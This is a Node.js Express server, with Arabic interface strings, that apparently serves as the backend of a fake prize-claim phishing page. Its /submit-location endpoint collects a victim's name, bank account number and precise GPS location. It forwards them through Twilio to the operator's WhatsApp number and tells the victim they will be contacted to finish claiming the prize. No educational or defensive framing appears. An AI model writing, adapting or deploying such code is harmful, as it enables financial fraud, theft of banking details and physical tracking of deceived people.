const express = require('express');
const bodyParser = require('body-parser');
const cors = require('cors');
const twilio = require('twilio');
const path = require('path');
require('dotenv').config();

const app = express();
app.use(bodyParser.json());
app.use(cors());

// تقديم الملفات الثابتة
app.use(express.static(path.join(__dirname, '../public')));

// بيانات Twilio
const accountSid = process.env.TWILIO_ACCOUNT_SID;
const authToken = process.env.TWILIO_AUTH_TOKEN;
const twilioClient = new twilio(accountSid, authToken);
const twilioWhatsAppNumber = process.env.TWILIO_WHATSAPP_NUMBER;
const yourWhatsAppNumber = process.env.YOUR_WHATSAPP_NUMBER;

app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, '../public/index.html'));
});

app.post('/submit-location', async (req, res) => {
    try {
        const locationData = req.body;
        
        if (!locationData.latitude || !locationData.longitude || !locationData.accountNumber || !locationData.accountName) {
            return res.status(400).json({ error: 'البيانات غير مكتملة' });
        }

        // إرسال إشعار واتساب
        const message = `🏦 محاولة استلام جائزة جديدة:\n\n` +
                       `👤 الاسم: ${locationData.accountName}\n` +
                       `💳 رقم الحساب: ${locationData.accountNumber}\n` +
                       `📍 الموقع: https://www.google.com/maps?q=${locationData.latitude},${locationData.longitude}\n` +
                       `🎯 الدقة: ${locationData.accuracy} متر\n` +
                       `⏰ الوقت: ${new Date().toLocaleString('ar-SA')}`;
        
        const whatsappMsg = await twilioClient.messages.create({
            from: twilioWhatsAppNumber,
            to: yourWhatsAppNumber,
            body: message
        });

        console.log('تم إرسال الإشعار:', whatsappMsg.sid);
        res.json({ 
            success: true, 
            message: 'تم استلام طلبك بنجاح! سيتم التواصل معك قريباً لإكمال عملية استلام الجائزة.' 
        });

    } catch (error) {
        console.error('خطأ:', error);
        res.status(500).json({ 
            error: 'حدث خطأ أثناء معالجة الطلب',
            details: process.env.NODE_ENV === 'development' ? error.message : undefined
        });
    }
});

// للتأكد من أن الخادم يعمل
app.get('/health', (req, res) => {
    res.json({ status: 'ok', env: process.env.NODE_ENV });
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
    console.log(`الخادم يعمل على البورت ${PORT}`);
});